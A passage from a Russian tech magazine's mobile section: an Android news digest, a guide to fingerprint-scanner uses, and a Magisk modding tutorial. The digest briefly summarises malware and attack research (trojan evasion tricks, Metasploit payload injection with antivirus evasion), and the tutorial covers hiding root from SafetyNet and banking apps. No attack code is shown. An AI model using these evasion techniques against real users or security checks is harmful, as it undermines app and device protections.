Apple с ее Siri и Google с ее Now и Google Assistant. Согласно Samsung,
это технология нового типа, использующая машинное обучение, спо соб ная
чуть ли не знать, о чем дума ет пользователь, и так далее и тому подобное.
  На самом деле Bixby — это просто еще один ассистент, выполненный
по образу и подобию Google Now и под держивающий два язы ка: корейский
и английский. Насколько он действительно точен и полезен, пока неясно, но в
нем есть одна примечательная особенность: он знает, что в данный момент
изображено на экране смартфона, и может делать подсказки и выполнять
функции, основываясь на этих знаниях. Например, его можно попросить
перевернуть изображение камеры или отска нировать текст, на который
наведен объектив. Samsung заяв ляет, что с помощью Bixby можно сделать
все, что можно сделать пальцем, и это действительно впечатляет — если зак ‐
рыть глаза на конфиденциальность. Все‐таки никому бы не хотелось, что бы
Samsung знала, чем он занимается в каждый кон кретный момент.
   Вторая интересная технология — это DeX, специальный док, подклю‐
чающийся кабелем HDMI к монитору. Как только ты вставляешь смартфон
в этот док, на экране монитора появляет ся полноценный рабочий стол в сти‐
ле Windows. Остается только спарить со смар тфоном клавиатуру и мышь —
и вуаля, ты превратил смартфон в пол ноценный ПК.
  Все это очень похоже на то, чем занима ются ребята из проекта Maru,
но если Maru позволя ет сделать из смартфона комп на базе полноценного
Debian, то здесь все несколько проще: на экране ты увидишь Android, но с
десктопным интерфейсом (на манер Remix OS). Для серьезных задач не под‐
ходит, зато позволя ет использовать одни и те же приложения на десктопе
и смартфоне и работать с одними и теми же данными — полная интеграция.
   Кстати, именно поэтому Microsoft анонсировала свою собственную вер‐
сию Galaxy S8 с предустановленными офисными приложениями, Outlook,
Skype и Cortana.





                  DeX превраща ет смар тфон в ПК


Другие интересные приложения:
 • Samsung Connect — приложение для центра лизованного управления
  умным домом, построенным вокруг Samsung Connect Home Smart Wi‐Fi
   System;
 • Samsung Cloud — облако Samsung для сохранения файлов и документов,
   которые можно открыть на любом устройстве;
 • Bluetooth Dual Audio — стриминг аудио сразу на несколь ко устройств Blue‐
   tooth с индивидуальным управлением громкостью (использует технологии
   Bluetooth 5).


ПОЧИТАТЬ
Android Security 2016 Year In Review — огромный отчет Google о состоянии
безопасности и борьбе со злов редами для Android.
  Несмотря на явно маркетинговый характер документа («посмотрите,
как все классно, а вы говорите — Android дырявый»), в нем можно найти мно‐
жество интереснейшей информации. Например, только в 2016 году Google
выплатила около мил лиона долларов более чем 125 исследователям в рам‐
ках программы Bug Bounty.
  Почти 50% поль зователей используют блокировку экрана PIN‐кодом
или отпечатком пальца. В Сомали этот процент достигает 82%, тогда как в
Украине только 27%, а в России около 35%. Процент устройств, работающих
на Android 5.1 и использующих шифрование, составлял лишь 8%, тогда как в
случае Android 7.0 этот показатель подскочил до 80%.
   Устройства, своевременно получавшие ежемесячные security‐обновления
в 2016 году: Google Pixel, Google Pixel XL, Motorola Moto Z, Droid, Oppo A33W,
Nexus 6P, Nexus 5X, Nexus 6, OnePlus 3, Samsung Galaxy S7, Asus Zenfone 3, BQ
Aquaris M5, Nexus 5, Vivo V3Max, LG V20, Sony Xperia X Compact, BlackBerry
PRIV.
  Процент   установок  приложений,  выпол няющих   рутинг  устройств
без ведома пользователя, — 0,00233%, процент установок легитимных при‐
ложений, выполняющих рутинг по запросу пользователя, — 0,3461%. Почти
все они установлены не из Google Play.





    Процент пользователей, блокирующих экран PIN‐кодом, по странам


Anti‐Debugging Fun With Android ART — описание метода защиты от отладки
приложений на Android 5.0. Метод основан на запатен тованной (!) технологии
Bluebox Security, суть которой заключается в обнулении глобально видимой
структуры gDvm.jdwpState, которая содержит текущие данные об отладке
и указатели на функции. В результате поток отладки JDWP падает и отладка
становится невозможной.
  В системах, использующих компилятор ART вместо виртуальной машины
Dalvik (Android 5.0 и выше), такой или сходной структуры нет, но есть другие
способы завершить поток JDWP. Один из них — это перезаписать метод jd‐
wpAdbState::ProcessIncoming(). В статье приведен весь необ ходимый код.
  A New Trend in Android Adware: Abusing Android Plugin Frameworks — иссле‐
дование нового трен да в области Adware, приложений, агрессивно показы‐
вающих  рекламу либо пытающихся  заставить пользователя  установить
и запустить другое приложение.
  Обычно подобный софт работает так: при запуске или через определен‐
ные отрезки времени приложение скачивает несколько дру гих приложений,
которые следует впарить пользователю, на карту памяти и время от времени
показывает диалог установки. Пользователи от этого не в восторге, но боль‐
шинство из них вне опасности: установку из сторонних источников необ‐
ходимо включить, затем  установить рекламируемое приложение, затем
запустить его. Не каждый юзер будет это делать.
  Однако с кон ца прошлого года наметилась новая тенденция — Adware,
использующее возможности фреймвор ка DroidPlugin. Последний пред став‐
ляет собой нечто вроде виртуальной машины для приложений. Он позволяет
написать приложение, которое будет способно запускать другие приложе ния
внутри себя, причем не просто запускать, а запускать автоматически и авто ‐
матически же устанавливать. Другими словами, использующее этот фрей‐
мворк Adware может незаметно скачать приложение на карту памяти, уста‐
новить его внутрь себя, соз дать ярлык на рабочем столе и запустить, а его
создатель получает за это денежку.
  Один из примеров такого Adware — приложение Clean Doctor, уже удален‐
ное из Play Store. Вместе с ним Google удалила еще два десятка подобных
приложений.
   Teardown of a Recent Variant of Android/Ztorg — разбор одной из новых вер‐
сий Android/Ztorg. Троян использует обфуска цию строк, библиотеку MarsDae‐
mon для того, чтобы его невозможно было выгрузить из памяти, и множество
техник обнаружения самых разных эмуляторов, начиная от стандартного эму ‐
лятора Android и заканчивая Genymotion и TaintDroid.
  К примеру, кроме проверки на наличие различных системных переменных
и файлов устройств (/dev/qemu_pipe), которые слу жат индикатором работы
внутри эмулятора, он также исследует файл /proc/net/tcp, где содержится
информация об активных TCP‐соединениях (ока зыва ется, в эму ляторах вмес‐
то информации об IP‐адресах и номерах портов — нули).
  В остальном все довольно стандар тно: загрузка payload через зашиф‐
рованный канал, root‐эксплоиты в комплекте, отключение SELinux, отклю‐
чение отладчика путем подмены файла /system/bin/debuggerd, самоко‐
пирование в разные участки системы для защиты от удаления.
    Injecting Metasploit Payloads into Android Applications — статья о внедрении
зловредного кода в при ложения для Android с помощью Metasploit Framework.
Статья пошагово описывает процесс внед рения payload, а также установку
защиты от обнаружения антивирусами с помощью apkwash.





                       Внедрение payload

Hacking Android apps with Frida — вводная статья о системе динамического
анализа и внедрения кода Frida.


РАЗРАБОТКА
Статьи
 • Implementing In‐App Billing in Android — статья о том, как реализовать фун‐
  кцию «покупки в приложении» в Android;
 • Optimize Your Build Speed — официальная документация Google о том,
   как повысить скорость сборки приложения для Android;
 • Android Threading: All You Need to Know — большая статья с рассказом
  о разных подходах к мно гопоточному программированию в Android;
 • App Shortcuts in details — статья о том, как реализовать App Shortcuts
   (меню,  появляющееся  при  долгом  удер жании  иконки  приложения)
   в Android;
 • Exploring Android O: Notiﬁcation Channels — статья о работе с каналами
   уведомлений в Android O;
 • Android Dev Sources — большой каталог ресурсов, посвящен ных раз‐
   работке для Android;
 • Reducing your networking footprint with OkHttp, Etags and If‐Modiﬁed‐Since —
   описание способов снизить пот ребление трафика приложением, исполь‐
   зуя библиотеку okHttp3.

Библиотеки:
 • CameraKit — очень простая в использовании библиотека для работы
   с камерой (Camera 2 API тоже поддерживается);
 • Open‐Source Android Apps — огромный каталог открытых приложений
   и игр для Android.

На этом на сегодня все.
X‐MOBILE

  СПОСОБОВ
       ИСПОЛЬЗОВАТЬ СКАНЕР
        ОТПЕЧАТКОВ ПАЛЬЦЕВ
       В ANDROID8





                                         Евгений Зобнин
                                                     zobnin@glc.ru





Официально поддержка сканера отпечатков пальцев появи ‐
лась в Android 6.0, но до сих пор мно гие пользователи вос‐
принимают его лишь как средство для разблокировки смар‐
тфона. Между тем  ска нер можно  использовать,  чтобы
нажимать кнопки «Домой» или «Назад», открывать шторку,
снимать камерой, запускать приложения, защищать пароли,
СМС, фотографии и бан ковские счета. А если ты умеешь
пользоваться Tasker, то смо жешь назначить на сканер отпе‐
чатков практичес ки любое действие.


Сразу оговоримся, что в этой статье речь пойдет о смартфонах на базе An‐
droid 6.0, в которых ска нер отпечатков и доступ к нему реализован согласно
требованиям Google. Только такие смартфоны позволяют сто ронним при‐
ложениям использовать сканер в своих целях. Китайские и некоторые дру гие
смартфоны со сканером отпечатков и Android 5.0/5.1 не подойдут, так
как хоть и поддерживают разблокировку смартфона прикосновением паль ца,
но не имеют API, с помощью которого сторонний софт мог бы его задейство‐
вать.


1. ВЕШАЕМ НА СКАНЕР КНОПКУ «ДОМОЙ», «НАЗАД» ИЛИ ЛЮБУЮ
ДРУГУЮ
Наверное, самое полезное применение, которое можно придумать сканеру
отпечатков, — это повесить на него одну из хардвар ных или экранных кнопок,
будь то «Домой», «Назад» или «Обзор». Все это позволяет сделать приложе‐
ние Fingerprint Quick Action.
   Устанавливаем приложение, ста вим галоч ку напротив пункта «Разрешить
Fingerprint Quick Action». Откроется окно «Спец. возможности», в котором
необходимо найти приложение и включить его. Далее можно повесить
на одиночное, двойное нажатие или свайп по сканеру одно из множества
действий, включая кнопки «Назад» и «Домой», а также «Выключить экран»,
«Показать панель уведомлений» (как в Google Pixel), «Разделить экран» (для
одновременного запуска двух приложений в Android 7.0) и другие.
  Имей в виду, что функции двойного нажатия и свайпа экспериментальные,
а поэтому работают из рук вон плохо (фактически не работают). Стоит огра‐
ничиться лишь одиночным нажатием.





            Вешаем на ска нер отпечат ков кнопку «Домой»


2. ЗАПУСКАЕМ ПРИЛОЖЕНИЯ
Тот же Fingerprint Quick Action позволяет с помощью сканера запускать при‐
ложения. Это может быть очень удобно, если чаще всего ты используешь
смартфон, например, для общения в Telegram/WhatsApp или звонков. Так
доступ к телефону или мессенджеру всегда будет под рукой.
  Выбрать приложение можно таким же способом, как и назначить кнопку.
Необходимо промотать список действий до самого конца и выбрать Launch
app or shortcut (да, приложение переведено не полностью), далее в главном
окне приложения появит ся пункт Single tap app or shortcut. Тут можно будет
выбрать приложение.





            Используем сканер для запуска приложений


3. ЗАЩИЩАЕМ ПРИЛОЖЕНИЯ
С помощью сканера отпечат ков можно не только запускать, но и защищать
приложения. Для этого можно использовать App Lock — приложение, поз‐
воляющее закрыть доступ к выбранным приложениям с помощью PIN‐кода,
паттерна либо отпечатка пальца.
   Пользоваться им очень просто. Запускаем приложение, включаем «Раз‐
блокировать отпечатком», далее вводим либо PIN, либо паттерн (здесь он
зовется рисунком), пропускаем экран с просьбой ввести email, на следующем
экране переходим в настройки, выбираем App Lock, активируем и возвра‐
щаемся. На следующем экране появится список приложений. Чтобы включить
защиту, достаточно активировать переключатель напротив име ни приложе‐
ния. Теперь при попытке запустить приложение появится просьба поднести
палец к сканеру.
  Однако не стоит воспринимать App Lock как действительно серьезную
защиту. Все, что требует ся сделать, чтобы ее обойти, — это либо убить про ‐
цесс App Lock, либо удалить приложение. Так что это скорее защита от детей
или просто технически неграмотных пользователей, в руках которых может
оказаться смартфон.





            «Защища ем» приложения с помощью App Lock


4. АВТОРИЗУЕМ ПОКУПКИ В GOOGLE PLAY
В Google Play есть защита от случайных покупок с помощью пароля от акка‐
унта Google. Она позволяет защитить тебя от опустошения карточки, если
смартфон случайно попадет не в те руки. Немногие знают, что Google Play
поддерживает авторизацию не только с помощью пароля, но и с помощью
отпечатка.
  Просто открой настройки Google Play (внизу выдвижной панели), включи
опцию «Аутен тификация по отпечат ку пальца» и введи пароль от аккаунта
Google. При следующей покупке Google Play попросит прикоснуться к сканеру
отпечатков.





           Включаем авторизацию по отпечатку в Google Play


5. ИСПОЛЬЗУЕМ СКАНЕР В КАЧЕСТВЕ КНОПКИ ЗАТВОРА
С помощью сканера отпечат ков, расположенного на перед ней панели смар‐
тфона, удобно делать снимки и записы вать видео. И для этого даже не нужно
устанавливать специальное приложение камеры и отказываться от своего
любимого. Достаточно установить Dactyl.
  Запускаешь приложение, проматы ваешь приветственные экраны и даешь
ему доступ к тем же «Спец. воз можностям». И это все, теперь установленные
на смартфоне камеры смогут делать снимок при прикосновении к сканеру.
  Среди поддерживаемых камер: Google Camera, Open Camera, Manual
Camera, Snap Camera, Camera 360, WhatsApp, Prisma, Instagram и множество
других. Автор утверждает, что этот список постоянно пополняется и поддер‐
жка новых камер приходит по воздуху, не требуя обновлять приложе ние.
  Недостаток один: триальная версия позволяет сделать не более десяти
снимков, а полная стоит 130 рублей. Многовато для такой простой утилиты.





                       Настраиваем Dactyl


6. ЗАЩИЩАЕМ ПАРОЛИ
Со времени выпуска Android 6.0 поддержкой сканера отпечатков пальцев
обзавелись многие менеджеры паролей, вклю чая популярный 1Password,
совместимый с KeePass KeepShare и печально известный за свои дыры Last‐
Pass. Описывать, как включить поддержку ска нера в них, не будем, все просто
и понятно.
  Но что более интересно, в маркете можно найти приложение Authenticator
Plus, которое фактически повторя ет воз можности приложений для генерации
одноразовых паролей Google Authenticator и FreeOTP, но при этом позволяет
использовать сканер отпечатка для доступа к своей функциональности.


7. ЗАЩИЩАЕМ ДАННЫЕ
А как насчет возможности защитить СМС, фотографии и другие данные?
Тоже пожалуйста. Для защиты СМС можно использовать приложение Evolve‐
SMS, а фотографий — Focus. Правда, «защита» в данном случае будет при‐
мерно такой же, как при использовании App Lock: никто не запрещает уста‐
новить другое приложение для просмотра СМС и фотографий и без проб лем
их увидеть. Более того, фотографии Android хранит на карте памяти вообще
без всяких ограничений доступа, так что увидеть их можно даже с помощью
простейшего файлового менеджера.
  Еще одно интересное приложение — Solo Photo. Это тоже просмотрщик
фотографий, но он не просто закрывает доступ к галерее, а бло кирует ее
на одной фотографии. Этакий защитный механизм,  когда необходимо
показать кому‐то снимок, но не допустить просмотр остальных.
   Как и положено, Solo Photo страдает от проблемы «просто запусти другой
просмотрщик фоток». Но ее можно свести на нет, если использовать при‐
ложение совместно со встроенным в Android режимом блокировки в при‐
ложении (Настройки → Безопасность → Блокировка в приложении). В этом
случае Solo Photo ограничит просмотр одной фоткой, а сам Android заб‐
локирует экран на Solo Photo. Все, что останется делать, — созерцать фот ку.
  Поддержка сканера отпечат ков есть и у многих банковских клиентов. Нап‐
ример, тот же Сбербанк позволяет получить доступ к функциям приложе ния,
используя отпечаток вместо пароля.





          Настраиваем сканер отпечат ка в Focus и Solo Photo


8. ДЕЛАЕМ ВСЕ, ЧТО ХОТИМ (TASKER)
Сканер отпечатков можно запрограммировать на самые разные действия:
выполнение удален ной команды по SSH, включение компа, управление умны‐
ми лампами и так далее. Однако в этом случае простой установкой и запус‐
ком сторон него софта уже не обойтись, необ ходимо купить Tasker, установить
несколь ко плагинов для него и составить правила реагирования на сканиро‐
вание пальца.
   Во‐первых,  понадобится   Fingerprint  Scanner   Tools.  Это  менее
функциональный аналог Fingerprint Quick Action, но с поддержкой Tasker. Так ‐
же понадобится сам Tasker и набор пла гинов к нему. Например:
 • SSH Tasker Plugin — позволя ет выпол нять уда лен ные коман ды по SSH;
 • WoL — приложение для пробуждения компа по сети с поддержкой Tasker;
 • AutoHue — плагин для управления умны ми лампами Hue и LIFX.

Запускаем Tasker, откры ваем «Настройки → Разное», ставим галочку нап‐
ротив «Разрешить внешний доступ». Переходим на вкладку Tasks и добавляем
новый  таск, нажав кнопку  +, указываем имя таска. Вновь нажимаем +
и выбираем любое из десят ков поддерживаемых Tasker действий либо нуж‐
ный плагин (который обыч но надо для начала настроить).
  Далее запускаем Fingerprint Scanner Tools, активируем перек лючатель En‐
able, в качестве Fingerprint action выбираем Execute Tasker task, в качестве
Task to be executed — созданный ранее таск. Теперь при касании сканера
отпечатков должен срабаты вать нужный таск.
  К сожалению, тема настройки Tasker выходит далеко за рамки дан ной
статьи, поэтому отправляем тебя читать статьи «Используем Tasker на полную
катушку» и «Скриптуем Android с Tasker и Autotools».





                Связываем сканер отпечат ков и Tasker


Сто ит ли доверять свои отпе чат ки сто рон нему соф ту?
Скорее всего, этот вопрос так или иначе проскакивал в твоей голове.
На самом деле волноваться не стоит. Сертифицированные Google смартфо ‐
ны обязаны хра нить снимок отпечатка в зашифрованном виде в хардварном
модуле TEE (Trusted Execution Environment, в процессорах Qualcomm ту же
роль играет TrustZone). Поэтому никто до твоих отпечатков не доберется
(только если он не очень продвинутый хакер).
   Это первое, а второе — Android не поз воляет сторонним приложениям
запрашивать у пользователя новые отпечат ки или получать доступ к уже име‐
ющимся. Все, что он позволяет сделать, — это попросить систему отсканиро‐
вать отпечаток, а затем дать ответ, верен ли он. Поэтому отпечатки надежно
защищены не только от взломщиков, но и от приложений.



ВЫВОДЫ
Как ты смог убедиться, сканер отпечатков можно приспособить не только
для разблокировки смартфона, но и для выпол нения многих других действий,
количество которых при использовании Tasker ста новится просто безгранич‐
ным.
X‐MOBILE





                      ЖИВУЮ                    НА                            MAGISK                 ANDROID              ПОМОЩЬЮ           С    МОДИФИЦИРУЕМ
МАГИЯ
ДЛЯ МОДДЕРА




Скажи, ты когда‐нибудь вносил изменения
в прошивку? Не просто Xposed, а куда
более низ коуровневые — нап ример, менял
/system/build.prop, уда лял системные при‐      Дмитрий Подкопаев aka
                                                                      BRADA
                                                                                         john.brada.doe@gmail.comложения, устанавливал ViPER4Android, под‐
менял /system/hosts, чтобы заб локировать
рекламу. Если ответ «да», то ты не понас ‐
лышке знаком с  ситуацией,  когда одно
неверное  движение  превраща ет  твой
смартфон в кирпич, а после обновления
системы приходится все делать заново.
К  счастью,  все  эти  проблемы  можно
решить, полностью авто матизиро вав вне‐
сение  изме нений  и  обезопа сив  себя
от случайных модификаций.


НЕМНОГО ТЕОРИИ
Чтобы понять прин цип работы Magisk, нач нем с так называемого несис‐
темного root (systemless root).
   Традиционно, чтобы получить root на смар тфоне или план шете, необ‐
ходимо было разместить файл su (который отвечает за повышение привиле‐
гий) в каталог /system/xbin/, то есть в системный раздел. Это действие изме ‐
няло  его  хеш‐сум му,  из‐за  чего  терялась  возможность  установки
ОТА‐обновлений.
  Более того, с выходом Marshmallow Google позаботилась о безопасности,
основы которой были заложены в Lollipop, сделав невозможной корректную
установку su в /system. Chainﬁre, разработчик SuperSU, начал поиск обходных
путей, результат которого стал довольно неожиданным.
  Вместо того чтобы размещать su в /system, он внедрил его в boot‐раздел,
содержащий ядро и так называемый RAM‐диск. Последний представляет
собой образ файловой системы, который загружается в оперативку на стадии
начальной загрузки Android. RAM‐диск содержит базовые компоненты сис‐
темы, которые дол жны быть запущены еще до того, как раздел /system будет
подключен.
  Оказалось, что если внедрить su прямо в RAM‐диск, то можно одним
махом обойти все защит ные механизмы Android и, кроме того, обеспечить
нормальную работу OTA. Такой способ рутинга получил название systemless
root (несистемный root) и стал основным в SuperSU для устройств, работа‐
ющих на Android Marshmallow и Nougat. Стоит отметить, что этот спо соб так же
применим и для устройств Samsung, работающих на версии 5.1 (или новее).
  Несистемный root имеет свои преимущества и недостатки. Основной
недостаток в том, что он не работает на устройствах с заблокирован ным заг‐
рузчиком по умол чанию, — конеч но, могут быть и обходные пути, но они спе‐
цифичны для каждого устройства.
  Однако несистемный root универсальнее традиционно го. Во мно гих слу‐
чаях он не ломает OTA‐обновления. Несистемный способ «чище», так как он
не добавляет и не изменяет файлы в разделе /system. Это означает, что уда‐
лить или скрыть root будет намного легче. После сброса к заводским нас‐
тройкам возможность root‐доступа будет удалена.
  Последнее преимущество — это, конечно, палка о двух кон цах. Большинс‐
тво пользователей предпочло бы, чтобы root‐доступ все же остался, но для
восстановления root‐доступа нужно будет просто прошить файл SuperSU.


MAGISK
Информация, изложенная выше, преследует одну цель — помочь понять, что
systemless — это удобно и не страшно. Ведь Magisk использует именно такой
способ работы с системой. Далее мы остановимся на особенностях Magisk
более подробно.
   Итак, Magisk — это утилита, которая патчит раздел boot и дает воз‐
можность устанавливать различные системные моды в режиме systemless.
Она позволяет запускать скрипты на разных этапах мон тирования и под‐
менять файлы (например, build.prop) еще до монтирования раздела /data,
скрывать наличие root и Xposed от при ложений и сервисов типа Android Pay,
Samsung Pay или Сбербанк Онлайн, а также спокойно получать OTA‐обновле‐
ния стоковых прошивок.
  Однако главное преимущество Magisk в том, что при модификации RAM‐
диска он прописывает в него лишь загрузчик модификаций, тогда как сами
моды хранятся в разделах /data и /cache. В результате после перепрошивки
не нужно будет применять все моды заново, достаточно всего лишь уста‐
новить Magisk, и он загрузит их все автоматически.
   Также стоит отметить и другие возможности: под мену состояния загрузчи‐
ка для других прог и состояния KNOX для устройств Samsung; несколько
точек входа/инъекций для разработчиков, надежно гаран тирующие паузы
при загрузке до тех пор, пока не сра ботают все изменения; режим post‐fs
(cache), который срабаты вает до того, как монтируется раздел /data, и поз‐
воляет, например, менять bootanimation; удаление dm‐verity, forceencrypt;
встроенный BusyBox, встроенная возможность под мены файла /etc/hosts
(для блокирования рекламы).


УСТАНАВЛИВАЕМ
Для работы Magisk необходим Android 5.0 и выше, разбло киро ванный заг‐
рузчик и кастомный рекавери. Magisk не работа ет на смартфонах Pixel, Pixel
XL и некоторых Asus. Может работать некорректно (не будет работать Magisk
Hide и, как результат, SafetyNet) на стоковых прошивках Samsung и их модах.
  Может быть два варианта установки Magisk в зависимости от того, есть ли
на смартфоне root.


Вариант 1: смартфон рутован
Устанавливаем Magisk Manager из Google Play. Запускаем приложение, сог‐
лашаемся дать ему права root и устанавливаем, следуя подсказкам приложе‐
ния.


Вариант 2: смартфон не рутован
Скачиваем актуальный установочный архив Magisk и прошиваем с помощью
TWRP. Если есть желание использовать SuperSU вместо встроенного в Ma‐
gisk менеджера root‐доступа, то шьем SuperSU перед Magisk.
   Стоит иметь в виду: если требуется легкое скрытие рута и минимум проб‐
лем с SafetyNet (то есть минимум проблем с Android/Samsung Pay, банками,
играми), следует использовать root, встроенный в Magisk. Ты можешь спра‐
ведливо заметить, что SuperSU можно скрыть с помощью suhide.zip, но он
не всегда работает так, как нам хочет ся. В некоторых случаях он вызывает
bootloop и необходимость восстановления из бэкапа.





             Установка Magisk через TWRP и первый запуск


Удаление Magisk
Если прога больше не нужна или ты словил проблемы с загрузкой (как обыч‐
но, дисклеймер: ты все дела ешь на свой страх и риск), например bootloop,
есть два варианта уда ления/восстановления:
 1. Прошиваем архив через TWRP.
 2. Переустанавливаем прошив ку и прошиваем род ной boot.

Иногда проблемы наблюдаются при одновременной установке MagiskSU
и SuperSU. В этом случае последний лучше удалить (в частности, из‐за этого
у автора не работало скрытие Magisk от SafetyNet).





                     Настройки и окно статуса


МОДУЛИ
Одно из неоспоримых преимуществ Magisk — универсальность. Существуют
как глобальные модификации, например ViPER4Android и Xposed, так и воз‐
можность самостоятельно создавать мел кие модификации под конкретное
устройство. Далее мы рассмотрим основные глобальные моды, а так же соз‐
дадим собственный простой мод для изменения/добавления переменных
в файл /system/build.prop.
  Все доступные моды есть в репозитории модулей Magisk manager в раз‐
деле Download («Загрузки»).





         Список доступных модов и установка Xposed framework


ViPER 4Android
ViPER’s Audio служит для улучшения звука в целом с помощью различных зву‐
ковых эффектов, то есть фактически это системный эквалайзер. При правиль‐
ной настройке под собственное восприятие ViPER способен выдать отличный
звук.
   Установка ViPER в обычном режиме способ на доставить немало приятных
минут, отданных устранению шероховатостей. Наличия root недостаточно,
необходима поддержка init.d, возможность модификации /system и перек‐
лючения SELinux в режим permissive. Magisk может изба вить от этих проблем.
  Для тех, кто не боится экспериментировать и желает получить от смартфо‐
на больше, чем дает производитель, однозначно рекомендуется к установке.


Xposed framework
Эта утилита — одна из самых значимых в разработ ке модов для Android. Тот,
кто не слышал об Xposed, скорее всего, очень далек от полноценного
модифицирования функциональности и внешнего вида Android‐устройств.
  Системные требования:
 • Android 5.x.x–6.0.x. Не поддерживает ся стоковый Android 5.0 от Samsung
   и стоковый Android 5.1 от Dell Venue;
 • чистая прошивка (не должно быть следов системного Xposed).

Установка:
 1. Делаем нандроид‐бэкап в рекавери.
 2. Ставим Xposed Installer.
 3. Скачиваем и ставим фреймворк Xposed с помощью Magisk Manager.
 4. Перезагружаем устройство.

Удаление: удаляем Xposed framework с помощью Magisk Manager.





      Окно статуса Xposed framework и список уста новленных модов
                              Xposed


Terminal debloater
Bloatware — устоявшийся термин для обозначения кучи ненужных прог, пре‐
дустановленных производителем. Многие из них системные, и удалить их
нельзя. Этот модуль позволяет это сделать.
   Установка:
 1. Качаем модуль из репозитория.
 2. Запускаем Terminal emulator.
 3. Вводим su и нажимаем Enter.
 4. Запускаем модуль командой debloat_magisk.
 5. Выбираем системные приложения, которые хотим удалить.

Стоит отметить, что необходимо точно знать название пакета, содержащего
модуль. Например, Velvet — это на самом деле Google Play.


Android Runtime Optimization
Как известно, с версии Lollipop Android перешел на использование новой
виртуальной машины ART (Android Runtime). Появилась она, конеч но, еще в
KitKat, но там была опциональная и работала в тестовом режиме с множес‐
твом багов.
  ART базируется на AOT‐компиляторе (ahead‐of‐time), который работает
лучше, чем  JIT  (just‐in‐time) за счет того, что компилирует приложение
заранее (а не в момент его запуска). Как результат, приложение работает
быстрее, но съедает больше памяти.
  ART поддается настройке с помощью утилиты dex2oat. Она позволяет ука‐
зать AOT‐компилятору, насколько он должен быть эффективным и быстрым.
Вот список параметров с расшифровкой:
 • everything — компилирует практически все, исключая class  initializers
   и несколько редких методов, которые слишком объемны для компилятора.
   Очень долгая процедура, скомпилирован ные приложения занимают много
  места в памяти;
 • speed — компилирует большинство методов и максимизирует произво ‐
   дительность, при этом оптимизация протекает долго и приложения
   занимают больше места (дефолтовая опция);
 • balanced — сбалансированный вариант, компромисс между скоростью
   компиляции, оптимизацией и занимаемым в памяти местом;
 • space — компилирует ограниченное число методов, оставляя в приори‐
   тете память устройства;
 • interpret-only — пропускает компилирование и полагается на внут‐
   ренний интерпретатор. Приложения оптимизируются быстро и занимают
   меньше памяти;
 • verify-none — специальная опция, которая пропускает верификацию
   и компилирование; можно использовать только для проверенного сис‐
   темного кода.

Значение speed — стандартное практически во всех про шивках. В теории
можно  получить  большую  производительность,  если  применить  флаг
everything. Для этого устанавливаем модуль, запускаем эму лятор терминала,
вводим


$ su
$ art_magisk

Выбираем номер необходимого флага, грузим в рекавери, делаем WIPE
DALVIK/CACHE для вступления изменений в силу, ждем конца оптимизации
процесса. Надо отметить, что результат зависит от устройства и в крайнем
случае может привести к бутлупу.
  Мод активно развивается, и новые версии и фиксы выходят почти каждый
день. Несмотря на это, все еще существуют проб лемы совместимости
с TouchWiz (и его наследником) и Facebook Messenger. По отзывам поль‐
зователей, после применения мода некоторые не заметили изменений,
а некоторые увидели сокращение используемой приложениями памяти
в /data при применении фла гов space и interpret‐only.





               Terminal debloater и Android Runtime Optimization


ДРУГИЕ МОДУЛИ
Вкратце остановлюсь еще на нескольких модулях. Большинство из них
не имеют графического интерфейса, так как просто вно сят изменения в нас‐
тройки.


Volume Steps Increase
Модуль увеличивает число доступных шагов для регулировки зву ка при про‐
игрывании media и громкости голоса при звонке в два раза. Если скачать ZIP
и разобрать его, станет видно, что модуль всего лишь добавляет две строки
в файл build.prop, а именно:
 • ro.conﬁg.vc_call_vol_steps=14
 • ro.conﬁg.media_vol_steps=30


Google Dialer
Простой модуль, который делает Google Dialer системным приложением, поз‐
воляя использовать все его возможности. При необходимости файлы при‐
ложений, находящиеся внутри архива, мож но самостоятель но заменить акту ‐
аль ными версиями.


Terminal App Systemizer
Модуль переводит любые установленные пользователем приложения в сис‐
темные. В отличие от предыдущего модуля, при удалении Magisk все внесен‐
ные изменения останутся рабочими.
  Интерфейс консольный. Вводим в терминале


$ su
$ systemize_magisk

Следуем подсказкам и после выбора приложения перегружаем устройство,
чтобы изменения вступили в силу.





                            Terminal App Systemizer

Чтобы удалить приложение из системных, заходим в /magisk/terminal_system‐
izer/system и /system/priv‐app и удаляем отту да приложение.


Universal init.d enabler
Этот модуль добавляет возможность запускать скрипты init.d при загрузке
системы. Скрипты, помещенные в /system/etc/init.d, будут работать, даже
если прошивка не поддерживает этого. Для использования необходимо,
поместив скрипт в папку, присвоить файлу права 0777. Так же модуль сов‐
местим с модами производительности, которые исполь зуют init.d‐скрипты,
такими как Nitro X Spark.


Mute UI
Модуль убирает все звуки UI, например звук снятия скриншота, зат вора
камеры, начала и кон ца видеоза писи, срабатывания NFC. Если разобрать
архив, то можно найти, что модуль просто стирает все файлы из папки
system/media/audio/ui/.


F-Droid Privileged Extension installer
F‐Droid — это магазин open source приложений, в котором, в частности, мож‐
но найти общесистемную резалку рекламы AdAway. Его проблема только
в том, что установку приложения приходит ся самостоятельно под тверждать,
так же как если бы ты его ставил с карты памяти (что, в сущ ности, и происхо‐
дит).
  Данный модуль наделя ет F‐Droid привилегиями и разрешениями, которые
имеют только системные приложения, в результате чего он может легко уста‐
навливать, удалять и обновлять приложения. Сам модуль занимает мало мес‐
та и взаимодействует с основной программой через AIDL IPC.


ПИШЕМ СОБСТВЕННЫЙ МОДУЛЬ
Ну и напоследок напишем собственный модуль. В этом нет ничего сложного.
  Для начала качаем шаблон с GitHub. В нем нужно изме нить два файла:
module.prop и conﬁg.sh. В первом содержится всего семь строк, отвечающих
за описание модуля, его имя, версию и прочее, а второй содержит скрипт
с необходимыми действиями.
  Важно предупредить пользователей Windows: в связи с тем что в файлах
дол жно использоваться форматирование строк в стиле UNIX (окончание
строки символом \\n, а не \\r\\n, как в Windows), автор рекомендует
работать в продвинутых текстовых редакторах типа Sublime, Atom, Notepad++,
иначе можно потерять форматирование и получить на выходе какую‐нибудь
гадость.
  Подробная инструкция по работе скрипта находит ся внутри комментариев
файла conﬁg.sh. Открываем файл, читаем, что нужно делать, и правим строки.
Допустим, ты хочешь подменить bootanimation.zip (анимация загрузки). Кида‐
ем новый файл bootanimation в папку /system/media, запаковываем все файлы
в ZIP и получаем файл, который можно прошить через Magisk или рекавери.
   Чтобы поменять системные переменные, как это делает модуль Volume
Steps   Increase,  необходимо   в  файле   conﬁg.sh  поменять  строку
на   PROPFILE=true  и   внести  нужные   строки   в  файл  шаблона
common/system.prop.
  Для примера напишем модуль, который уберет надоевшую бутанимацию
и немного сократит время загрузки устройства. Внесем PROPFILE=true, а в
